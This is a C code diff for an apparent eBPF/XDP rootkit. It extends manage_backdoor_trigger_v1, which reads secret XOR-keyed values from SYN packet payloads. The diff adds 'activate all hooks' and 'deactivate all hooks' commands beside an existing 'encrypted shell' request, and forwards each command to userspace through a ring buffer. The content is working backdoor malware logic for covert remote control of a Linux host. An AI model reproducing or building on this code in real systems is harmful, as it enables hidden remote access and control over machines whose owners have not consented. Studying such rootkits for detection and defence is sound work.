@@ -55,6 +55,10 @@ static __always_inline int manage_backdoor_trigger_v1(char* payload, __u32 paylo
     __builtin_memcpy(section3, payload+0x0C, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
     int correct = 1;
     int command_received = -1;
+
+    //Checking for a valid K3, which indicates the command sent by the backdoor client
+    //Not the cleanest code, needs refactoring
+    //Encrypted shell request
     __builtin_memcpy(key3, CC_TRIGGER_SYN_PACKET_KEY_3_ENCRYPTED_SHELL, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
     for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
         result3[ii] = section[ii] ^ section2[ii] ^ section3[ii];
@@ -65,7 +69,43 @@ static __always_inline int manage_backdoor_trigger_v1(char* payload, __u32 paylo
     if(correct == 1){
         //Found valid k3 value
         command_received = CC_PROT_COMMAND_ENCRYPTED_SHELL;
-    }else{
+        goto backdoor_finish;
+    }
+
+    correct = 1;
+    //Hook activate all request
+    __builtin_memcpy(key3, CC_TRIGGER_SYN_PACKET_KEY_3_HOOK_ACTIVATE_ALL, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
+        result3[ii] = section[ii] ^ section2[ii] ^ section3[ii];
+        if(result3[ii]!=(key3[ii])){
+            correct = 0;
+        }
+    }
+    if(correct == 1){
+        //Found valid k3 value
+        command_received = CC_PROT_COMMAND_HOOK_ACTIVATE_ALL;
+        goto backdoor_finish;
+    }
+
+    correct = 1;
+    //Hook deactivate all request
+    __builtin_memcpy(key3, CC_TRIGGER_SYN_PACKET_KEY_3_HOOK_DEACTIVATE_ALL, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
+        result3[ii] = section[ii] ^ section2[ii] ^ section3[ii];
+        if(result3[ii]!=(key3[ii])){
+            correct = 0;
+        }
+    }
+    if(correct == 1){
+        //Found valid k3 value
+        command_received = CC_PROT_COMMAND_HOOK_DEACTIVATE_ALL;
+        goto backdoor_finish;
+    }
+    
+
+backdoor_finish:
+    //Found no valid key 3
+    if(correct==0){
         bpf_printk("FAIL CHECK 3\n");
         return XDP_PASS;
     }
@@ -76,6 +116,14 @@ static __always_inline int manage_backdoor_trigger_v1(char* payload, __u32 paylo
     switch(command_received){
         case CC_PROT_COMMAND_ENCRYPTED_SHELL:
             bpf_printk("Received request to start encrypted connection\n");
+            ring_buffer_send_backdoor_command(&rb_comm, pid, command_received);
+            break;
+        case CC_PROT_COMMAND_HOOK_ACTIVATE_ALL:
+            bpf_printk("Received request to activate all hooks\n");
+            ring_buffer_send_backdoor_command(&rb_comm, pid, command_received);
+            break;
+        case CC_PROT_COMMAND_HOOK_DEACTIVATE_ALL:
+            bpf_printk("Received request to deactivate all hooks\n");
             ring_buffer_send_backdoor_command(&rb_comm, pid, command_received);
             break;
         default:
